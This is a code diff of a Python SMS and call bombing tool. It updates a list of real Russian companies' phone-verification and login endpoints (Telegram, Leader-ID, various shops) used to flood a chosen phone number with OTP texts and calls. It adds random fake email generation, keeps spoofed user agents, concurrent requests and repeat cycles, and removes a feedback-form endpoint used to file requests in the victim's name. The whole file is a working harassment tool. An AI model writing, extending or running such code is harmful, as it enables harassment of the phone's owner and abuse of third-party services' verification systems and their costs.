@@ -1,16 +1,27 @@
 #!/home/arch/sms-tester/venv/bin/python
 import requests
 import time
-import threading
+import random
+import string
 from concurrent.futures import ThreadPoolExecutor
 from fake_useragent import UserAgent
 
 ua = UserAgent()
 
-def formate_phone(phone):
-    if len(phone) >= 12:
-        return f"{phone[:2]}({phone[2:5]})-{phone[5:8]}-{phone[8:10]}-{phone[10:12]}"
-    return phone
+def generate_email():
+    templates = [
+        f'{random.randint(1,9999)}qwerty{random.randint(1,9999)}poplok{random.randint(1,9999)}',
+        f'asd{random.randint(1,9999)}vdiu{random.randint(1,9999)}gv{random.randint(1,9999)}uhn',
+        f'kmjnhgfds{random.randint(1,9999)}eefcx{random.randint(1,9999)}9841fd{random.randint(1,9999)}1b',
+        f'{random.randint(1,9999)}rftfg{random.randint(1,9999)}xcvm{random.randint(1,9999)}7pwgs',
+        f'g{random.randint(1,9999)}y{random.randint(1,9999)}u{random.randint(1,9999)}i{random.randint(1,9999)}werdf',
+        f'{random.randint(1,9999)}etrdg{random.randint(1,9999)}Dxvjoj{random.randint(1,9999)}b{random.randint(1,9999)}98',
+        f'poo{random.randint(1,9999)}hqazh{random.randint(1,9999)}cxbvc845vfdvfbbdfs{random.randint(1,9999)}',
+        f'l{random.randint(1,9999)}h{random.randint(1,9999)}r{random.randint(1,9999)}y{random.randint(1,9999)}i{random.randint(1,9999)}f{random.randint(1,9999)}d{random.randint(1,9999)}45dfser',
+        f'portdfcv{random.randint(1,9999)}CTRP{random.randint(1,9999)}458745{random.randint(1,9999)}d',
+        f'wsexrctfybgu{random.randint(1,9999)}fyguhmio{random.randint(1,9999)}zwsxedcrfvgbynhu{random.randint(1,9999)}drftghuji87'
+    ]
+    return f'{random.choice(templates)}@gmail.com'
 
 def slice_phone(phone):
     if len(phone) >= 12:
@@ -19,72 +30,39 @@ def slice_phone(phone):
 
 APIS = [
     {
-        "name": "Utair", "url": "https://b.utair.ru/api/v1/login/",
-        "payload": {"login": "{phone}", "confirmation_type": "standart"},
-        "formate": False, "origin": "https://www.utair.ru/", "referer": "https://www.utair.ru/"
-    },
-    {
-        "name": "FixPrice", "url": "https://api.fix-price.com/buyer/v2/registration/phone/request",
+        "name": "My.Telegram.org", "url": "https://my.telegram.org/auth/send_password",
         "payload": {"phone": "{phone}"}, "formate": True,
-        "origin": "https://fix-price.com", "referer": "https://fix-price.com"
+        "origin": "https://my.telegram.org", "referer": "https://my.telegram.org/"
     },
     {
-        "name": "MVideo", "url": "https://www.mvideo.ru/bff/auth/v2/otp/send",
-        "payload": {"phoneNumber": "{phone}", "sendBy": "cascade"}, "formate": False,
-        "origin": "https://www.mvideo.ru", "referer": "https://www.mvideo.ru/"
+        "name": "VTK-Moscow", "url": "https://vtk-moscow.ru/users/",
+        "payload": {"from_phone": "{phone}", "apply": "reg_apply"}, "formate": True,
+        "origin": "https://vtk-moscow.ru", "referer": "https://vtk-moscow.ru/"
     },
     {
-        "name": "Adamas", "url": "https://rest.adamas.ru/v1/phone/send",
-        "payload": {"phone": "{phone_slice}", "action": "auth"}, "formate": False,
-        "origin": "https://adamas.ru", "referer": "https://adamas.ru/"
+        "name": "V-Dymov", "url": "https://www.v-dymov.ru/local/include/ajax/confirmation.php",
+        "payload": {"form": "login", "phone": "+{phone}"}, "formate": True,
+        "origin": "https://www.v-dymov.ru", "referer": "https://www.v-dymov.ru/"
     },
     {
-        "name": "Lenta", "url": "https://lenta.com/api-gateway/v1/auth/code/send",
-        "payload": {"phone": "{phone}", "acceptMarketingCommunications": True}, "formate": False,
-        "origin": "https://lenta.com", "referer": "https://lenta.com/"
-    },
-    {
-        "name": "Smotrim", "url": "https://smotrim.ru/personal/login",
-        "payload": {"phone": "{phone}", "redirect": "/tariffs"}, "formate": False,
-        "origin": "https://smotrim.ru", "referer": "https://smotrim.ru/"
-    },
-    {
-        "name": "Rutube", "url": "https://rutube.ru/multipass/api/v3/accounts/phone/register/",
-        "payload": {"phone": "{phone}", "agreements": {"agree_personal_data": True, "agree_user_agreement": True}, "send_method": "sms"},
-        "formate": False, "origin": "https://rutube.ru", "referer": "https://rutube.ru/"
-    },
-    {
-        "name": "Citilink", "url": "https://www.citilink.ru/registration/confirm/phone/",
+        "name": "Leader-ID", "url": "https://leader-id.ru/api/v4/auth/start-phone-confirm",
         "payload": {"phone": "{phone}"}, "formate": False,
-        "origin": "https://www.citilink.ru", "referer": "https://www.citilink.ru/"
+        "origin": "https://leader-id.ru", "referer": "https://leader-id.ru/registration"
     },
     {
-        "name": "Karusel", "url": "https://app.karusel.ru/api/v1/phone/",
-        "payload": {"phone": "{phone}"}, "formate": False,
-        "origin": "https://app.karusel.ru", "referer": "https://app.karusel.ru/"
+        "name": "TortoMaster", "url": "https://kaliningrad.tortomaster.ru/include/ajax/flashcall_helper.php",
+        "payload": {"REGISTER[PHONE_NUMBER]": "{phone}", "send_sms": "Y", "agree": "Y"}, "formate": True,
+        "origin": "https://kaliningrad.tortomaster.ru", "referer": "https://kaliningrad.tortomaster.ru/personal/?register=yes"
     },
     {
-        "name": "McDonalds", "url": "https://mcdonalds.ru/api/auth/code",
-        "payload": {"phone": "{phone}"}, "formate": False,
-        "origin": "https://mcdonalds.ru", "referer": "https://mcdonalds.ru/"
+        "name": "Azbuka-Severa (CALL)", "url": "https://azbuka-severa.ru/local/ajax/get_phone_code.php",
+        "payload": {"PHONE": "{phone}"}, "formate": True,
+        "origin": "https://azbuka-severa.ru", "referer": "https://azbuka-severa.ru/"
     },
     {
-        "name": "MTS", "url": "https://api.mtstv.ru/v1/users",
-        "payload": {"msisdn": "{phone}"}, "formate": False,
-        "origin": "https://api.mtstv.ru", "referer": "https://api.mtstv.ru/"
-    },
-    {
-        "name": "BelkaCar (CALL)", "url": "https://belkacar.ru/get-confirmation-code",
-        "payload": {"phone": "{phone}"}, "formate": False,
-        "origin": "https://belkacar.ru", "referer": "https://belkacar.ru/"
-    }
-]
-
-FEEDBACK_APIS = [
-    {
-        "name": "Teleseti (Feedback)", "url": "https://api.teleseti.com/zayvka",
-        "payload": {"name": "Ivan", "mobile": "{phone}", "town": "Moscow"},
-        "formate": False, "origin": "https://teleseti.com", "referer": "https://teleseti.com/"
+        "name": "Shop.Hlebprom (CALL)", "url": "https://shop.hlebprom.ru/",
+        "payload": {"backurl": "/", "AUTH_FORM": "Y", "TYPE": "AUTH", "USER_LOGIN": "{phone}", "PERSONAL_REG_TYPE": "phone", "Login": "true"}, "formate": True,
+        "origin": "https://shop.hlebprom.ru", "referer": "https://shop.hlebprom.ru/"
     }
 ]
 
@@ -126,7 +104,7 @@ def run_mode(mode, phone, cycles):
     elif mode == "3":
         target_apis = APIS
     elif mode == "4":
-        target_apis = APIS + FEEDBACK_APIS
+        target_apis = APIS
 
     print(f"\n[*] Starting mode {mode} for {phone}")
     print(f"[*] Cycles: {cycles}. Total APIs: {len(target_apis)}\n")
@@ -150,10 +128,10 @@ def main():
     """
     print(ascii_art)
     print("Select mode:")
-    print("  1. SMS (SMS only)")
-    print("  2. CALL (Calls only)")
-    print("  3. Mixer (SMS + Calls)")
-    print("  4. H3ll1sh (SMS + Calls + Feedback)")
+    print("  1. SMS")
+    print("  2. CALL")
+    print("  3. Mixer")
+    print("  4. H3ll1sh")
     print("  0. Exit\n")
     
     mode = input("> ")
@@ -172,7 +150,7 @@ def main():
         return
 
     try:
-        cycles = int(input("Enter cycles (e.g., 5): "))
+        cycles = int(input("Enter cycles: "))
     except ValueError:
         print("[!] Please enter a valid number!")
         return
